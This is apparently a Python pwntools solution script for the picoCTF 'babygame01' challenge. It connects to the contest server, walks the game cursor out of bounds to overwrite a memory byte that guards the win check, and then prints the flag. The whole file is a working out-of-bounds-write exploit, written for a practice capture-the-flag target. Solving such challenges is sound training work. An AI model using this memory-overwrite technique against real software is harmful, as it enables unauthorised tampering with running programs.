# picoCTF-babygame01-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 53556

    p = remote(host, port)

    with context.silent:
        # move to the checked char's location in memory (right before map's location)
        p.recvuntil(b"X\r\n")
        for i in range(82):
            p.sendline(b"d")
            p.recvuntil(b"X\r\n", timeout=1)
        for i in range(5):
            p.sendline(b"w")
            p.recvuntil(b"X\r\n", timeout=1)
        
        # overwrite char with a player icon (in this case I used 'A') so char != NULL
        p.sendline(b"lA")
        p.recvuntil(b"X\r\n", timeout=1)

        # move back in bounds of map
        p.sendline(b"s")
        p.recvuntil(b"X\r\n", timeout=1)

        # solve problem automatically
        p.sendline(b"p")
        p.recvuntil(b"win!\r\n", timeout=3)
        
        # get flag
        flag = p.recvall(timeout=1).decode("utf-8").split("flage\r\n")[1]
        p.close()
    
    # reveal flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()